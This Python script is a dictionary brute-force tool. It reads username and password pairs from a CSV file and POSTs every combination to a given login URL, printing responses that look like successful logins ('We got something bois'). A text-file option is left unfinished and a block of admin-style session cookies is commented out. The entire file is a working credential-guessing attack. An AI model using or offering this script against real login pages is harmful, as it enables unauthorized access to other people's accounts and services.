import requests
from bs4 import BeautifulSoup
import argparse
import csv

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("-d", "--data-form", dest="data_form", help="Name of the username and password field in the data form")
arg_parser.add_argument("-u", "--url", dest="url", help="The login url to POST login requests to")
arg_parser.add_argument("--csv-dict", dest="csv_dict", help="The CSV dictionary for usernames and passwords")
arg_parser.add_argument("--txt-dict", dest="txt_dict", help="The txt dictionary for usernames and passwords")

args = arg_parser.parse_args()

username = list()
password = list()

# print("Argument types:\ndata-form: {}\n".format(type(args.data_form))) 

# Opens the username and dictionary file for usernames and passwords
if args.csv_dict is None and args.txt_dict is None:
    print("Must provide a dictionary for brute forcing, either with --csv-dict or --txt-dict")
elif args.csv_dict is not None:
    with open(args.csv_dict, mode='r') as dict_file:
        csv_reader = csv.DictReader(dict_file)
        line_count = 0
        for row in csv_reader:
#            print("Column names are {}".format(",".join(row)))
            if line_count == 0:
                line_count += 1
                continue
            if "N/A" in row["Username"] or "BLANK" in row["Username"]:
                row["Username"] = ""
            if "N/A" in row["Password"] or "BLANK" in row["Password"]:
                row["Password"] = ""
            username.append(row["Username"])
            password.append(row["Password"])
            line_count += 1
        print("[*] Read CSV file, found {} usernames and {} passwords".format(len(username), len(password)))

''' TODO
elif args.txt_dict is not None:
'''

# Putting the name of the username and password data-form field supplied in the arguments into the data form
form_data = dict()
username_header = args.data_form.split(",")[0]
password_header = args.data_form.split(",")[1]
form_data[username_header] = ''
form_data[password_header] = ''

url = args.url

'''
cookies = {
    'sessionid': '19af6645',
    'auth': 'ok',
    'expires': 'Sun, 15-May-9999 01:45:46 GMT',
    'language': 'en_us',
    'sys_UserName': 'admin',
}
'''
print("[*] Initiating the brute-force attack")
for x in username:
    for y in password:

        form_data[username_header] = x
        form_data[password_header] = y

        response = requests.post(url, data=form_data)
#        print("Testing " + x + " and " + y + ". Status code: " + str(response.status_code))
        if response.status_code != 401 and response.status_code != 404 and response.status_code != 301:
#            print(response.content)
            print(response.url)
#            soup = BeautifulSoup(response.content, 'html.parser')
            if ("incorrect" not in str(response.content)):
                print("^^^ We got something bois ^^^")
